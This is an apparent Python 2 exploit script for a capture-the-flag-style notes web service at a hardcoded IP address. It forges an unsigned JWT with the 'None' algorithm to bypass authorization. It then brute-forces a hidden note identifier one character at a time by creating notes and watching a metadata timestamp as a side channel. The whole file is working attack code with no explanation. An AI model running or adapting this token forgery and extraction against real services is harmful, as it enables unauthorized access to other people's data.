import requests
import time

dictionary = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

url = "http://159.203.178.9/rpc.php"

#proxies = {'http' : '127.0.0.1:8080' }
get = {'method':'getNotesMetadata'}

create = {'method':'createNote'}

reset = {'method':'resetNotes'}

my_headers = { 'Accept' : 'application/notes.api.v2+json', 'authorization' : 'eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MX0.', 'Content-Type' : 'application/json'}

count = 0
p = "E"
#print p
for i in range (0,19):
    
    for chars in dictionary:
        #reset notes
        r = requests.post(url, params = reset, headers = my_headers )
        #print r.text
    
        #create note
        payload = '{"id":"'+ str(p)+ chars +'", "note":"Thisismynote"}'
        r = requests.post(url, params = create, headers = my_headers, data = payload)#, proxies=proxies )
        #print r.text
    
        #Get notes meta data
        r = requests.get(url, params = get, headers = my_headers )
        a = r.text
        b = a.split('"')
        #print int(b[5])
        if int(b[5]) != 1528911533:
            #print dictionary[int(count-1)]
            #print count
            if int(count) != 62:
                count = count + 1
                
            else:
                #print count
                count = 0
            

        else:
            z = str(dictionary[int(count-1)])
            count = 0
            #print z

            #maitaining the id
            p = p + z
            print str(p)
            break





